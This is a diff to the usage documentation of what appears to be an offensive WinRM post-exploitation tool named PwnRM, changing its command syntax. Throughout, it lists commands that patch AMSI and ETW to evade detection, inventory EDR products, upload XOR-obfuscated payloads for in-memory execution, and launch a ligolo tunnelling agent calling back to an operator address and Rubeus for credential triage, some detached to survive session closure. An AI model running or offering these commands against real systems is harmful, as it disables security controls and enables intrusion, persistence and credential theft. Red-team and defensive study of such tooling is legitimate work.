@@ -24,14 +24,14 @@ remain independent controls.
 Selectors are applied independently:
 
 ```text
-!evasion --edr
-!evasion --amsi
-!evasion --etw
-!evasion --amsi --etw
+!evasion edr
+!evasion amsi
+!evasion etw
+!evasion amsi etw
 !amsi
 ```
 
-With no selector, AMSI and ETW patches are attempted. `--edr` inventories a
+With no selector, AMSI and ETW patches are attempted. `edr` inventories a
 small known driver list and SecurityCenter2 AV products. The generated native
 calls validate library/function addresses and `VirtualProtect` results.
 
@@ -59,12 +59,12 @@ Controls include:
 
 ## XOR staging
 
-`!upload -xor` stores bytes transformed by a random per-process key. The remote
+`!upload --xor` stores bytes transformed by a random per-process key. The remote
 loader reverses that transformation in memory:
 
 ```text
-!upload -xor payload.ps1 C:\Windows\Temp\payload.bin
-!psrun -xor C:\Windows\Temp\payload.bin
+!upload --xor payload.ps1 C:\Windows\Temp\payload.bin
+!psrun --xor C:\Windows\Temp\payload.bin
 ```
 
 The upload and execution commands must use the same running PwnRM process. XOR
@@ -89,23 +89,23 @@ cleared.
 ## Native and managed PE execution (`!noconsolation`)
 
 `!noconsolation` accepts a PE from the operator filesystem or an HTTP(S) URL.
-Use `--remote` with an explicit `--native` or `--managed` mode when `SOURCE` is
+Use `--remote` with an explicit `native` or `managed` mode when `SOURCE` is
 already a path on the Windows target:
 
 ```text
 # No output capture: launch in a background runspace and return immediately.
-!noconsolation --native ligolo-agent.exe -connect 192.0.2.10:11601
-!noconsolation --managed Rubeus.exe triage
+!noconsolation native ligolo-agent.exe -connect 192.0.2.10:11601
+!noconsolation managed Rubeus.exe triage
 
 # No capture, but survive closure of the PwnRM/WinRM runspace.
-!noconsolation --detached --native agent.exe -connect 192.0.2.10:11601
+!noconsolation native --detached agent.exe -connect 192.0.2.10:11601
 
 # Opt in to foreground output capture (60-second native default timeout).
-!noconsolation --capture-output --native whoami.exe /all
-!noconsolation --capture-output --managed Rubeus.exe triage
+!noconsolation native --capture-output whoami.exe /all
+!noconsolation managed --capture-output Rubeus.exe triage
 
 # Execute an existing target-side file without first downloading it locally.
-!noconsolation --remote --native C:\Windows\System32\whoami.exe /all
+!noconsolation native --remote C:\Windows\System32\whoami.exe /all
 ```
 
 Output capture is intentionally opt-in. If neither `--capture-output` nor its
